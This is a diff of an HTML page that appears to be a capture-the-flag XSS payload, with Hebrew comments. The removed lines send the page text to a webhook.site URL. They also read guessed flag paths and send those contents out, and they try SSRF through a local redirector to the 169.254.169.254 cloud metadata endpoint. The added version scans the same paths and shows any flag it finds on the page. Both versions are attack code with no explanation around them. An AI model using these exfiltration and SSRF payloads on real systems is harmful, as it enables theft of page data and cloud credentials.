@@ -1,36 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>Flag XSS Extractor</title></head>
+<head><title>Flag Finder</title></head>
 <body>
-  <h1>JS Execution Test</h1>
-  <p>✅ JS Executed</p>
+  <h1>Scanning for Flag...</h1>
   <script>
-    // שולח את תוכן הדף ל־webhook
-    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?body=' + encodeURIComponent(document.body.innerText));
-
-    // נתיבים נפוצים לדגל
     const paths = [
       '/flag', '/flag.txt', '/secret', '/secret.txt',
       '/static/flag', '/hidden/flag.txt', '/home/ctf/flag', '/flag.html'
     ];
 
-    // מנסה לקרוא את כל הנתיבים
-    paths.forEach(path => {
-      fetch(path)
-        .then(r => r.text())
-        .then(data => {
-          fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?found=' + encodeURIComponent(path + ' => ' + data));
-        })
-        .catch(e => {});
-    });
+    let found = false;
 
-    // ניסיון דרך SSRF דרך redirector פנימי (אם קיים)
-    fetch('http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/')
-      .then(res => res.text())
-      .then(data => {
-        fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?ssrf=' + encodeURIComponent(data));
-      })
-      .catch(e => {});
+    const check = async () => {
+      for (const path of paths) {
+        try {
+          const res = await fetch(path);
+          const text = await res.text();
+
+          if (text.includes('flag{') || text.includes('CTF{')) {
+            document.body.innerHTML = `<h2 style="color:green;">🚩 FLAG FOUND:</h2><pre>${text}</pre>`;
+            found = true;
+            break;
+          }
+        } catch (e) {
+          // ממשיכים אם יש שגיאה
+        }
+      }
+
+      if (!found) {
+        document.body.innerHTML += `<p style="color:red;">❌ No flag found</p>`;
+      }
+    };
+
+    check();
   </script>
 </body>
 </html>
